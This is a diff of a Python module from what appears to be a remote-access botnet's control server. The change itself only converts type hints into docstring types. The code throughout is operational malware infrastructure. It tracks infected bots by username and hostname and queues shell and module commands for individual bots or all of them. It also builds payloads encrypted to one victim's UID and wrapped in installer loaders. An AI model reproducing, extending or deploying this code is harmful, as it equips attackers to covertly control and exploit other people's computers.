@@ -11,11 +11,14 @@ from textwrap import dedent
 from Cryptodome.Cipher import AES
 from Cryptodome.Random import get_random_bytes
 from Cryptodome.Hash import MD5
-from typing import Tuple, Optional, List
 
 
 class RequestType:
     """Enum class for bot request types."""
+
+    def __init__(self):
+        pass
+
     STAGE_1 = 0
     GET_COMMAND = 1
     RESPONSE = 2
@@ -23,6 +26,10 @@ class RequestType:
 
 class CommandType:
     """Enum class for command types."""
+
+    def __init__(self):
+        pass
+
     NONE = 0
     MODULE = 1
     SHELL = 2
@@ -31,7 +38,12 @@ class CommandType:
 class Command:
     """This class represents a command."""
 
-    def __init__(self, command_type: int, command: bytes = b"", options: dict = None):
+    def __init__(self, command_type, command, options = None):
+        """
+        :param command_type: int
+        :param command: bytes
+        :param options: dict
+        """
         self.type = command_type
         self.command = command
         self.options = options
@@ -51,8 +63,17 @@ class Command:
 class Bot:
     """This class represents a bot."""
 
-    def __init__(self, bot_uid: str, username: str, hostname: str, last_online: float,
-                 local_path: str, system_version: str, loader_name: str):
+    def __init__(self, bot_uid, username, hostname, last_online,
+                 local_path, system_version, loader_name):
+        """
+        :type bot_uid: str
+        :type username: str
+        :type hostname: str
+        :type last_online: float
+        :type local_path: str
+        :type system_version: str
+        :type loader_name: str
+        """
         self.uid = bot_uid
         self.username = username
         self.hostname = hostname
@@ -99,8 +120,11 @@ class Model:
 
         self._database.commit()
 
-    def add_bot(self, bot: Bot):
-        """Adds a bot to the database."""
+    def add_bot(self, bot):
+        """Adds a bot to the database.
+
+        :type bot: Bot
+        """
         with self._lock:
             self._cursor.execute("INSERT INTO bots VALUES(?,?,?,?,?,?,?)", (
                 bot.uid, bot.username, bot.hostname, bot.last_online,
@@ -108,27 +132,43 @@ class Model:
             ))
             self._database.commit()
 
-    def update_bot(self, bot_uid: str, last_online: float, local_path: str):
-        """Updates the bot's last online time and local path."""
+    def update_bot(self, bot_uid, last_online, local_path):
+        """Updates the bot's last online time and local path.
+
+        :type bot_uid: str
+        :type last_online: float
+        :type local_path: str
+        """
         with self._lock:
             self._cursor.execute("UPDATE bots SET last_online = ?, local_path = ? WHERE bot_uid = ?",
                                  (last_online, local_path, bot_uid))
-        self._database.commit()
+            self._database.commit()
 
-    def get_bot(self, bot_uid: str) -> Bot:
-        """:return The bot object of the given UID."""
+    def get_bot(self, bot_uid):
+        """Retrieves a bot from the database.
+
+        :type bot_uid: str
+        :rtype: Bot
+        """
         with self._lock:
             response = self._cursor.execute("SELECT * FROM bots WHERE bot_uid = ? LIMIT 1", (bot_uid,)).fetchone()
             return Bot(response[0], response[1], response[2], response[3], response[4], response[5], response[6])
 
-    def remove_bot(self, bot_uid: str):
-        """Removes the bot from the database."""
+    def remove_bot(self, bot_uid):
+        """Removes the bot from the database.
+
+        :type bot_uid: str
+        """
         with self._lock:
             self._cursor.execute("DELETE FROM bots WHERE bot_uid = ?", (bot_uid,))
             self._database.commit()
 
-    def is_known_bot(self, bot_uid: str) -> bool:
-        """:return True if the bot is already known to us."""
+    def is_known_bot(self, bot_uid):
+        """:return: True if the bot is known to us.
+
+        :type bot_uid: str
+        :rtype: bool
+        """
         with self._lock:
             response = self._cursor.execute("SELECT * FROM bots WHERE bot_uid = ?", (bot_uid,)).fetchone()
 
@@ -137,8 +177,13 @@ class Model:
             else:
                 return False
 
-    def get_bots(self, limit: int = -1, skip_amount: int = 0) -> list:
-        """:return: A list of bot objects."""
+    def get_bots(self, limit = -1, skip_amount = 0):
+        """:return: A list of bot objects.
+
+        :type limit: int
+        :type skip_amount: int
+        :rtype: list
+        """
         with self._lock:
             bots = []
             response = self._cursor.execute("SELECT * FROM bots LIMIT ? OFFSET ?", (limit, skip_amount))
@@ -148,22 +193,31 @@ class Model:
 
             return bots
 
-    def get_bot_amount(self) -> int:
-        """:return: The amount of bots in the database."""
+    def get_bot_amount(self):
+        """:return: The amount of bots in the database.
+
+        :rtype: int
+        """
         with self._lock:
             response = self._cursor.execute("SELECT Count(*) FROM bots")
             return response.fetchone()[0]
 
-    def set_global_command(self, command: Command):
-        """Sets the global command."""
+    def set_global_command(self, command):
+        """Sets the global command.
+
+        :type command: Command
+        """
         with self._lock:
             self._cursor.execute("DELETE FROM global_command")
             self._cursor.execute("DELETE FROM global_executed")
             self._cursor.execute("INSERT INTO global_command VALUES(?)", (str(command),))
             self._database.commit()
 
-    def get_global_command(self) -> str:
-        """:return: The globally set raw command."""
+    def get_global_command(self):
+        """:return: The globally set raw command.
+
+        :rtype: str
+        """
         with self._lock:
             response = self._cursor.execute("SELECT * FROM global_command").fetchone()
 
@@ -172,14 +226,21 @@ class Model:
             else:
                 return response[0]
 
-    def add_executed_global(self, bot_uid: str):
-        """Adds the bot the list of who has executed the global module."""
+    def add_executed_global(self, bot_uid):
+        """Adds the bot the list of who has executed the global module.
+
+        :type bot_uid: str
+        """
         with self._lock:
             self._cursor.execute("INSERT INTO global_executed VALUES (?)", (bot_uid,))
             self._database.commit()
 
-    def has_executed_global(self, bot_uid: str) -> Tuple[bool, Optional[str]]:
-        """:return: True if the bot has executed the global command or if no global command has been set."""
+    def has_executed_global(self, bot_uid):
+        """:return: True if the bot has executed the global command or if no global command has been set.
+
+        :type bot_uid: str
+        :rtype: (bool, str or None)
+        """
         with self._lock:
             global_command = self.get_global_command()
 
@@ -194,14 +255,22 @@ class Model:
                 else:
                     return False, global_command
 
-    def add_command(self, bot_uid: str, command: Command):
-        """Adds the command to the bot's command queue."""
+    def add_command(self, bot_uid, command):
+        """Adds the command to the bot's command queue.
+
+        :type bot_uid: str
+        :type command: Command
+        """
         with self._lock:
             self._cursor.execute("INSERT INTO commands VALUES(?,?)", (bot_uid, str(command)))
             self._database.commit()
 
-    def get_command_raw(self, bot_uid: str) -> str:
-        """Return and removes the first (raw base64) command in the bot's command queue, otherwise an empty string."""
+    def get_command_raw(self, bot_uid):
+        """Return and removes the first (raw base64) command in the bot's command queue, otherwise an empty string.
+
+        :type bot_uid: str
+        :rtype: str
+        """
         with self._lock:
             response = self._cursor.execute("SELECT * FROM commands WHERE bot_uid = ?", (bot_uid,)).fetchone()
 
@@ -211,31 +280,43 @@ class Model:
                 self._remove_command(bot_uid)
                 return response[1]
 
-    def _remove_command(self, bot_uid: str):
-        """Removes the first command in the bot's queue."""
+    def _remove_command(self, bot_uid):
+        """Removes the first command in the bot's queue.
+
+        :type bot_uid: str
+        """
         with self._lock:
             # Workaround for https://sqlite.org/compile.html#enable_update_delete_limit
             self._cursor.execute("DELETE FROM commands WHERE rowid = "
                                  "(SELECT rowid FROM commands WHERE bot_uid = ? LIMIT 1)", (bot_uid,))
             self._database.commit()
 
-    def add_upload_file(self, url_path: str, local_path: str):
-        """Adds a file which should be hosted by the server.
+    def add_upload_file(self, url_path, local_path):
+        """
+        Adds a file which should be hosted by the server,
+        should be automatically removed by the caller in x seconds.
 
-        Should be automatically removed by the caller in x seconds.
+        :type url_path: str
+        :type local_path: str
         """
         with self._lock:
             self._cursor.execute("INSERT INTO upload_files VALUES (?,?)", (url_path, local_path))
             self._database.commit()
 
-    def remove_upload_file(self, url_path: str):
-        """Remove the file from the list of files the server should host."""
+    def remove_upload_file(self, url_path):
+        """Remove the file from the list of files the server should host.
+
+        :type url_path: str
+        """
         with self._lock:
             self._cursor.execute("DELETE FROM upload_files WHERE url_path = ?", (url_path,))
             self._database.commit()
 
-    def get_upload_files(self) -> List[Tuple[str, str]]:
-        """:return: A tuple containing the URL path and local file path."""
+    def get_upload_files(self):
+        """:return: A tuple containing the URL path and local file path.
+
+        :rtype: (str, str)
+        """
         with self._lock:
             tuple_list = []
             response = self._cursor.execute("SELECT * FROM upload_files").fetchall()
@@ -249,9 +330,18 @@ class Model:
 class PayloadFactory:
     """Builds encrypted payloads which can only be run on the specified bot."""
 
+    def __init__(self):
+        pass
+
     @staticmethod
-    def create_payload(bot_uid: str, payload_options: dict, loader_options: dict) -> str:
-        """:return: The configured and encrypted payload."""
+    def create_payload(bot_uid, payload_options, loader_options):
+        """:return: The configured and encrypted payload.
+
+        :type bot_uid: str
+        :type payload_options: dict
+        :type loader_options: dict
+        :rtype: str
+        """
         # Configure bot.py
         with open(path.realpath(path.join(path.dirname(__file__), path.pardir, "bot", "bot.py"))) as input_file:
             configured_payload = ""
@@ -287,8 +377,14 @@ class PayloadFactory:
         """.format(PayloadFactory._openssl_encrypt(bot_uid, configured_payload)))
 
     @staticmethod
-    def wrap_loader(loader_name: str, loader_options: dict, payload: str) -> str:
-        """:return: The loader which will load the (configured and encrypted) payload."""
+    def wrap_loader(loader_name, loader_options, payload):
+        """:return: The loader which will load the (configured and encrypted) payload.
+
+        :type loader_name: str
+        :type loader_options: dict
+        :type payload: str
+        :rtype: str
+        """
         loader_path = path.realpath(path.join(
             path.dirname(__file__), path.pardir, "bot", "loaders", loader_name, "install.py")
         )
@@ -306,7 +402,12 @@ class PayloadFactory:
         return loader
 
     @staticmethod
-    def _openssl_encrypt(password: str, plaintext: str) -> str:
+    def _openssl_encrypt(password, plaintext):
+        """
+        :type password: str
+        :type plaintext: str
+        :rtype: str
+        """
         # Thanks to Joe Linoff, taken from https://stackoverflow.com/a/42773185
         salt = get_random_bytes(8)
         key, iv = PayloadFactory._get_key_and_iv(password, salt)
@@ -324,7 +425,14 @@ class PayloadFactory:
         return b64encode(openssl_cipher_text).decode()
 
     @staticmethod
-    def _get_key_and_iv(password: str, salt: bytes, key_length: int = 32, iv_length: int = 16) -> tuple:
+    def _get_key_and_iv(password, salt, key_length = 32, iv_length = 16):
+        """
+        :type password: str
+        :type salt: bytes
+        :type key_length: int
+        :type iv_length: int
+        :rtype: tuple
+        """
         password = password.encode()
 
         try:
